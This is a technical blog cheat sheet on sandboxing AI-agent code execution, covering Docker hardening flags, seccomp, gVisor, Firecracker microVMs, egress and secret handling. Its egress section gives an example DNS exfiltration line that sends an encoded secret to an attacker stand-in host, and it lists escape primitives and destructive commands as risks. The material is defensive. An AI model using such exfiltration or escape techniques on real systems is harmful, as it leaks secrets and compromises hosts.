---
layout: nutshell
title: "Agent Sandboxing in a Nutshell"
date: 2026-10-24
image:
  path: /assets/images/og/agent-sandboxing.png
  width: 1200
  height: 630
  alt: "Agent Sandboxing in a Nutshell — jitrc.com"
summary: "Cheat sheet for running model-written code: what a container actually confines, when you need gVisor or a microVM, and the flags and timeouts that keep the blast radius small."
tags: [agents, sandboxing, infrastructure]
---


<div class="callout">
<strong>Verified 2026-10-24</strong> against the gVisor docs, Firecracker's <code>design.md</code> and <code>SPECIFICATION.md</code>, Docker's seccomp documentation, the Linux Landlock API, and the Modal and E2B sandbox docs. Docker flags were checked with <code>docker run --help</code>. <strong>No snippet here ran against a live daemon</strong> — this machine has no running Linux engine and no hosted provider was called, so treat the provider snippets as transcribed, not executed.
</div>

## What it does

A sandbox is the boundary that turns "the model wrote code" into "code ran, and nothing else
happened". It is three separate promises — *what the code can touch*, *how much it can consume*,
and *how long it can run* — and you need all three before an agent may execute anything.

## Why it exists

- **The blast radius is the product.** An agent that can run commands can also `rm -rf`, read
  `~/.ssh`, POST your env vars to a stranger, or fork-bomb the host. None of that requires
  malice; a wrong path is enough.
- **Every agent loop needs a clean slate.** Reproducible tests need a filesystem that starts
  identical every time and is thrown away after.
- **The boundary is what you can promise a customer.** "It runs your code" is unshippable
  without an answer to "where, as whom, and for how long".

<figure class="diagram">
<svg viewBox="0 0 640 250" role="img" aria-labelledby="sandbox-diagram-title">
  <title id="sandbox-diagram-title">The agent process sits inside a container, which sits inside either the host kernel, a gVisor userspace kernel, or a microVM boundary</title>
  <defs>
    <marker id="sb-arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#666"/>
    </marker>
  </defs>

  <rect x="10" y="24" width="620" height="150" rx="8" fill="#ededed" stroke="#666"/>
  <text x="320" y="46" text-anchor="middle" font-size="12" fill="#222">Host kernel</text>

  <rect x="30" y="58" width="250" height="100" rx="6" fill="#fff" stroke="#4b0082"/>
  <text x="155" y="82" text-anchor="middle" font-size="13" fill="#222">Container</text>
  <text x="155" y="102" text-anchor="middle" font-size="10" fill="#666">namespaces · cgroups</text>
  <text x="155" y="118" text-anchor="middle" font-size="10" fill="#666">seccomp · capabilities</text>
  <text x="155" y="138" text-anchor="middle" font-size="10" fill="#666">shared kernel</text>

  <rect x="300" y="58" width="150" height="100" rx="6" fill="#fff" stroke="#4b0082"/>
  <text x="375" y="82" text-anchor="middle" font-size="13" fill="#222">gVisor</text>
  <text x="375" y="102" text-anchor="middle" font-size="10" fill="#666">Sentry in userspace</text>
  <text x="375" y="118" text-anchor="middle" font-size="10" fill="#666">syscalls intercepted</text>
  <text x="375" y="138" text-anchor="middle" font-size="10" fill="#666">no passthrough</text>

  <rect x="470" y="58" width="140" height="100" rx="6" fill="#fff" stroke="#4b0082"/>
  <text x="540" y="82" text-anchor="middle" font-size="13" fill="#222">microVM</text>
  <text x="540" y="102" text-anchor="middle" font-size="10" fill="#666">KVM boundary</text>
  <text x="540" y="118" text-anchor="middle" font-size="10" fill="#666">own Linux kernel</text>
  <text x="540" y="138" text-anchor="middle" font-size="10" fill="#666">Firecracker class</text>

  <text x="320" y="196" text-anchor="middle" font-size="10" fill="#666">Increasing isolation and cost →</text>
  <line x1="120" y1="204" x2="520" y2="204" stroke="#666" stroke-width="1.5" marker-end="url(#sb-arrow)"/>
  <text x="120" y="222" text-anchor="middle" font-size="9" fill="#666">cheap, fast, escapes are kernel bugs</text>
  <text x="520" y="222" text-anchor="middle" font-size="9" fill="#666">slower cold start, hardware-enforced</text>
</svg>
<figcaption>Three different answers to "what happens when the code is actively hostile". A container is the weakest of the three, and the one everybody starts with.</figcaption>
</figure>

## Cheat sheet: the Docker flags that matter

Every flag below is a real `docker run` flag (checked with `docker run --help`).

| Flag | Stops | Does not stop |
|---|---|---|
| `--network=none` | All egress, including DNS | Side channels out (timing, shared memory) |
| `--read-only` | Writes to the image filesystem | Writes to mounted volumes, `/tmp` unless tmpfs |
| `--tmpfs /tmp:rw,size=64m,nosuid` | Unbounded temp writes, executables in `/tmp` | Memory/disk use inside the tmpfs cap |
| `--cap-drop=ALL` | `mount`, `ptrace`, raw sockets, module loading | Anything the process can do as an unprivileged user |
| `--security-opt=no-new-privileges` | Setuid binaries raising privileges | Nothing else |
| `--user 65534:65534` | Running as root inside the box | Files the UID can still read |
| `--pids-limit=128` | Fork bombs | CPU/memory exhaustion under that limit |
| `--memory=512m --memory-swap=512m` | Memory overrun past the cgroup | CPU starvation |
| `--cpus=1` | Eating every core | Slow-but-legal runaway work |
| `--ulimit nofile=1024:1024` | FD exhaustion of the host | Nothing else |
| `--security-opt seccomp=profile.json` | Syscalls not in the allowlist | Anything on the allowlist |

A workable baseline — note that it is *a* baseline, not a guarantee:

```bash
docker run --rm \
  --network=none \
  --read-only \
  --tmpfs /tmp:rw,size=64m,nosuid,nodev,noexec \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --user 65534:65534 \
  --pids-limit=128 \
  --memory=512m --memory-swap=512m \
  --cpus=1 \
  -v "$PWD/work:/work:rw" \
  -w /work \
  python:3.13-slim python run.py
```

`--read-only` without a writable `/tmp` breaks almost every runtime (Python wants to write
bytecode, Node wants a cache dir). The tmpfs is not optional.

## Docker's default seccomp profile is doing more than you think

Docker ships a default allowlist that denies **around 44 syscalls out of 300+**. It is on
unless you turn it off, and it blocks things an agent will eventually try:

| Blocked | Because |
|---|---|
| `mount`, `umount`, `pivot_root` | Privileged, `CAP_SYS_ADMIN` gated |
| `ptrace`, `process_vm_readv/writev` | Process inspection across the boundary |
| `bpf`, `perf_event_open` | Kernel instrumentation |
| `unshare`, `setns`, `clone` (namespace flags) | New namespaces from inside |
| `io_uring_setup/enter/register` | Past container-escape bugs |
| `add_key`, `keyctl`, `request_key` | The kernel keyring is not namespaced |
| `open_by_handle_at` | Historic breakout primitive |

`--security-opt seccomp=unconfined` is therefore not a performance tweak; it is deleting a
control plane. If a workload genuinely needs a blocked syscall, extend the profile, don't
disable it.

## When a container is not enough

Namespaces, cgroups and seccomp all run *in the host kernel*. A kernel bug is therefore a
host compromise, and an agent executing model-written code is exactly the workload that finds
those bugs. Two escapes from that:

| | gVisor | microVM (Firecracker) |
|---|---|---|
| Boundary | Userspace kernel (Sentry) intercepts syscalls; no passthrough to the host | Hardware virtualization via KVM; separate guest kernel |
| Compatibility | Most syscalls implemented; not all `/proc`, `/sys`, or every syscall exists | Full Linux; you own the kernel image |
| Cost | Per-syscall overhead; memory-safe Go implementation | Fixed guest memory (128 MiB floor in the reference config) |
| Cold start | Container-like — no kernel to boot | ≈125 ms from `InstanceStart` to guest `/sbin/init` |
| Failure mode | Sentry bug | Hypervisor or guest-kernel bug |

gVisor's own framing is worth internalizing: it is **not** a syscall filter (seccomp), **not**
a wrapper over Linux isolation primitives, and **not** a VM in the everyday sense. It is an
application kernel in userspace, written in Go, that answers syscalls itself. Its own docs are
candid that the trade is "reduced application compatibility and higher per-system-call
overhead" — and that a syscall-heavy workload will feel it.

Firecracker's numbers are from its own specification, measured on `m5d.metal`/`m6g.metal` with
hyperthreading disabled:

| Property | Value |
|---|---|
| VMM start → API socket | ≤ 8 CPU ms (wall clock 6–60 ms, typically ~12 ms) |
| `InstanceStart` → guest `/sbin/init` | ≤ 125 ms (minimal kernel and rootfs, serial console off) |
| VMM memory overhead | ≤ 5 MiB for 1 vCPU / 128 MiB guest |
| Guest CPU performance | > 95% of bare metal |

## The error taxonomy you should design before you need it

A sandbox run ends in exactly four ways, and conflating them is why agent retries thrash:

| Outcome | Signal | Typical code | What the agent should do |
|---|---|---|---|
| `Timeout` | Wall clock exceeded, killed by the supervisor | 124 (`timeout(1)`), or your own | Narrow the task or raise the budget — retrying identically is pointless |
| `OOM` | Cgroup OOM kill, `SIGKILL` | 137 | Reduce the working set; a retry will die the same way |
| `Crash` | Non-zero exit or signal from the code | 1, 139 (segfault), 134 (abort) | Show stderr to the model; this is often fixable |
| `Policy` | Denied by the sandbox, not the code | `EACCES`/`EPERM`, or your own | Do **not** retry. Escalate to the human or change approach |

Codes 137/143 are signal conventions (`128 + signal`, so `SIGKILL` = 137, `SIGTERM` = 143),
not a spec. Modal documents `sandbox.terminate()` returning 137 for exactly this reason.
Whatever you choose, make `Timeout` and `Policy` *unretryable* by default — the two failure
modes that burn the most tokens are a model retrying a timeout and a model retrying a denial.

## Egress is the leak you will forget

`--network=none` is the only egress rule you can enforce locally without extra machinery.
Everything else is an allowlist proxy, because DNS alone exfiltrates data:

```text
resolve(hex-encoded-secret + ".attacker.example")   # no TCP needed
```

| Approach | Enforces | Cost |
|---|---|---|
| `--network=none` | Nothing leaves | Agent can't install packages or call APIs |
| Egress proxy allowlist | Host + path + method | You run and secure the proxy |
| Hosted sandbox network rules | Same, provider-managed | Provider-shaped config; verify defaults |
| Default networking | **Nothing** | One line of code |

Defaults matter here. E2B's docs state plainly that **every sandbox has outbound internet
access by default**, controlled by an on/off switch or allow/deny lists. If you assume a
sandbox is offline until told otherwise, you will be wrong on at least one provider.

## Secrets should not enter the sandbox

An env var is readable by every process in the box, visible in `/proc/<pid>/environ`, and gets
captured in any memory snapshot. Two patterns that hold up:

- **Inject at the edge.** E2B's secret store is referenced by a network rule, and its egress
  proxy adds the credential to matching outbound HTTPS requests — the value is never in the
  sandbox. The docs are explicit that no read surface returns a secret value.
- **Short-lived identity.** A workload token minted per sandbox, scoped to one resource, expiring
  in minutes, beats a long-lived key that outlives the run.

If neither is available, put the secret in a file with `0400` owned by the sandbox user, never
in the process environment — and accept that a snapshot of the box now contains it.

## Snippets

### gVisor under Docker

```bash
# Install runsc and register it as a Docker runtime (Linux host required)
curl -fsSL https://gvisor.dev/archive.key | sudo gpg --dearmor -o /usr/share/keyrings/gvisor-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/gvisor-archive-keyring.gpg] https://storage.googleapis.com/gvisor/releases release main" \
  | sudo tee /etc/apt/sources.list.d/gvisor.list > /dev/null
sudo apt-get update && sudo apt-get install -y runsc
sudo runsc install
sudo systemctl reload docker

docker run --rm --runtime=runsc --network=none --read-only \
  --tmpfs /tmp --cap-drop=ALL python:3.13-slim python -c 'print("inside Sentry")'
```

`--runtime=runsc` is the whole integration: `runsc` implements the OCI runtime spec, so the
container tooling above it does not change.

### Hosted sandbox, two shapes

```python
# E2B — a VM per sandbox, code-interpreter flavour
from e2b_code_interpreter import Sandbox

sbx = Sandbox.create()
execution = sbx.run_code("print('hello world')")
print(execution.logs)
sbx.kill()
```

```python
# Modal — Sandbox is a container; pick gVisor or a real VM per workload
import modal

app = modal.App.lookup("my-app", create_if_missing=True)
sb = modal.Sandbox.create(app=app, runtime="gvisor", timeout=10 * 60)
p = sb.exec("python", "-c", "print('hello')", timeout=3)
print(p.stdout.read())
sb.terminate()
```

Modal's `runtime` switch is the useful part: `gvisor` for most work, `vm` when the workload
needs a full Linux environment (Docker-in-sandbox, FUSE, nested cgroups). The docs note that
GPU sandboxes are `gvisor`-only, and that a VM sandbox reports its own kernel (`Linux modal 7.2.6`
in their example) rather than the host's.

### The interface worth standardising on

The swap between a local container, a gVisor runtime and a hosted VM is where agent codebases
rot. Keep it behind one protocol and the swap is a class:

```python
from typing import Protocol


class SandboxRuntime(Protocol):
    async def start(self, image: str, *, cpu: float, memory_mb: int) -> str: ...
    async def run(self, sandbox_id: str, cmd: list[str], *, timeout_s: int) -> tuple[int, str, str]: ...
    async def put(self, sandbox_id: str, path: str, data: bytes) -> None: ...
    async def get(self, sandbox_id: str, path: str) -> bytes: ...
    async def stop(self, sandbox_id: str) -> None: ...
```

Return `(exit_code, stdout, stderr)` and map it to the four outcomes above in one place. Every
provider above can implement this in under a hundred lines; the reason to write it down is that
the mapping — not the SDK — is the thing you will get wrong four times.

## Typical use cases

| Scenario | Isolation that fits |
|---|---|
| Agent runs `pytest` in your own repo | Container + `--network=none` + read-only root |
| Agent executes model-written code | gVisor or a microVM; a container is not enough |
| Multi-tenant code execution service | microVM per tenant, or gVisor with a hardened host |
| Data analysis notebook | Hosted sandbox with a persistent volume, plan-sized CPU |
| CI for untrusted PRs | Ephemeral microVM per job, egress allowlist for package registries |
| Long-running agent workspace | Sandbox with pause/snapshot, not a 24h timer you forget |

## Gotchas

- **`--read-only` needs tmpfs.** Everything from `/tmp` to Python's `__pycache__` will fail
  without it, and the error usually surfaces as a confusing `EACCES` deep in a library.
- **Mounting `docker.sock` is root.** Any sandbox with the host socket can start a privileged
  container and leave. There is no partial version of this.
- **`--cap-drop=ALL` is not the same as non-root.** Both, or the `--user` flag is decoration.
- **OOM kills look like crashes.** Exit 137 with no traceback is the cgroup, not the code.
  Check the sandbox's own reason before telling the model to "fix the bug".
- **The clock is shared.** A sandbox without a network still sees host time; don't use timing
  as a secrecy primitive.
- **Snapshots preserve what you forgot.** Pause/resume keeps memory and filesystem — including
  anything a secret ever touched. Rotate after the snapshot, not before.
- **`/proc` is a data leak.** Environment variables, command lines, and sometimes other
  processes' maps. `--pids-limit` and a private PID namespace are part of the fix.
- **A timeout is not a kill.** If you stop waiting but leave the process running, you have paid
  for the work twice and leaked a process. Kill, then reap.
- **Seccomp profiles are per-arch.** An allowlist tuned on `x86_64` will break `arm64` and
  silently fall back if you are not checking.

## Where it sits next to the rest

Agent harness → **sandbox** → tools. The sandbox is not a security product you buy once; it is
the assertion "this code may do exactly these things" expressed in kernel features you can
enumerate. ACP and MCP decide *what the agent is asked to do*; the sandbox decides *what happens
when it does it*.
